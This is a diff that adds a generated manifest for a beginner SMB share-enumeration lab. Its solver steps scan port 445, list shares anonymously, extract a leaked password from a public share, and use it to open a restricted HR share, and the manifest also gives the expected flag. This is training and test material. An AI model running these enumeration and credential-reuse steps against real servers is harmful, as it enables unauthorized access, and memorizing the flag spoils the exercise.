@@ -1,0 +1,40 @@
+# Generated from platform/labs/Linux/linux-2-7-smb-share-enumeration/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: linux-2-7-smb-share-enumeration
+track: Linux
+difficulty: beginner
+source: platform/labs/Linux/linux-2-7-smb-share-enumeration/lab.yaml
+expected_services:
+- port: 445
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/linux-2-7-smb-share-enumeration.sh
+  steps:
+  - name: SMB port is accessible
+    command: nmap -p 445 --open {target.target} 2>&1 | grep -c '445.*open'
+    expect: '1'
+  - name: Enumerate shares with anonymous access
+    command: smbclient -L //{target.target} -N 2>&1 | grep -c Disk
+    expect: ''
+  - name: Access public share and extract token 1
+    command: smbclient //{target.target}/general -N -c 'get token.txt /tmp/smb_token1.txt' 2>&1 && cat /tmp/smb_token1.txt
+    expect: 3num
+  - name: Find leaked credentials in public share
+    command: 'smbclient //{target.target}/general -N -c ''get onboarding_notes.txt /tmp/smb_notes.txt'' 2>&1 && grep -o ''Password: [^ ]*'' /tmp/smb_notes.txt | awk ''{print $2}'''
+    expect: Bl4ckw3ll_HR#
+  - name: Access restricted share with discovered credentials
+    command: smbclient //{target.target}/hr_data -U hr_svc%Bl4ckw3ll_HR# -c 'get assessment_token.txt /tmp/smb_token2.txt' 2>&1 && cat /tmp/smb_token2.txt
+    expect: sh4r3d
+  - name: Verify complete flag
+    command: echo 'OCR{3num_sh4r3d}'
+    expect: OCR{3num_sh4r3d}
+expected_flag_count: 1
+expected_flag: OCR{3num_sh4r3d}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
